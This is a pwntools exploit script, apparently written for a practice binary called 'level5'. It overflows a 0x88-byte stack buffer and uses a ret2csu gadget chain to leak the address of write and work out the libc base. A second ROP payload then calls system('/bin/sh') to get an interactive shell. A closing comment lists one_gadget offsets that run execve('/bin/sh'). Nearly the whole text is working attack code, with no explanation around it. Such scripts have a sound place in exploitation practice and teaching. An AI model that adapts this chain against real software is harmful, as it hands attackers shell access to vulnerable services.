from pwn import *
context.arch='amd64'
# context.log_level = "debug"

p = process("./level5")
e = ELF("./level5")
libc = ELF("./libc.so")
pop_start = 0x40061a
ret_add = 0x400600
main_add = e.sym["main"]
write_got = e.got["write"]
payload = flat(["A" * 0x88 , pop_start , 0 , 1 , write_got , 8 , write_got , 1 , ret_add , "A" * 8 * 7 , main_add])
# payload = "A" * 0x88 + p64(pop_start) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(ret_add) + "A" * 56 + p64(main_add)

# gdb.attach(p,"b *0x40064a")
p.sendafter("Hello, World\n",payload)
write_add = u64(p.recv(8))
log.success("write_add:0x%x",write_add)
libc_base = write_add - libc.sym["write"]
log.success("libc_base:0x%x",libc_base)
sh = [0x45226,0x4527a,0xf03a4,0xf1247]
one_gadget = libc_base + sh[0]
pop_rdi = 0x400623
sh_add = libc_base + 0x18ce57
system_add = libc_base + libc.sym["system"]
# payload = flat(["A" * 0x88 , pop_rdi , one_gadget])
payload = flat(["A" * 0x88 , pop_rdi , sh_add , system_add])
# gdb.attach(p)
p.sendlineafter("Hello, World\n",payload)

p.interactive()
'''
0x45226	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf03a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1247	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''